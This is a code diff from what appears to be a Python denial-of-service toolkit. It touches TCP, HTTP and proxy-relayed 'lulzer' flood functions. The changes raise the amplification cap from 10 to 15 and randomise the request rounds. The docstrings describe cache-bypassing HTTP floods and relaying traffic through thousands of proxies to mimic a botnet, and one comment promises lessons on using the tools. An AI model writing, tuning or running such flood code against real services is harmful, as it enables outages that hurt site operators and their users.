@@ -97,7 +97,7 @@ class tcflood(threading.Thread):
     s.connect((target,port))
     if (port==443) or (port==8443):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for l in range(packs2,packs1):
+    for l in range(random.randint(packs2,packs1)):
      m=''
      for li in range(30,50): 
       m+=str(random.randint(1,1000000))+random.choice(lis)
@@ -224,7 +224,7 @@ class htflood(threading.Thread):
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def httpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1):
+def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level=1):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -249,8 +249,8 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level
  global amp
  if ampli<1:
   ampli=1
- if ampli>10:
-  ampli=10
+ if ampli>15:
+  ampli=15
  amp=ampli
  global packs1
  packs1=roundmax
@@ -337,7 +337,7 @@ class prflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=10,roundmin=5,roundmax=15,level=1):
+def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=15,roundmin=5,roundmax=15,level=1):
  '''
    this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
    it takes the following parameters:
@@ -380,8 +380,8 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
  global amp
  if ampli<1:
   ampli=1
- if ampli>10:
-  ampli=10
+ if ampli>15:
+  ampli=15
  amp=ampli
  global packs1
  packs1=roundmax
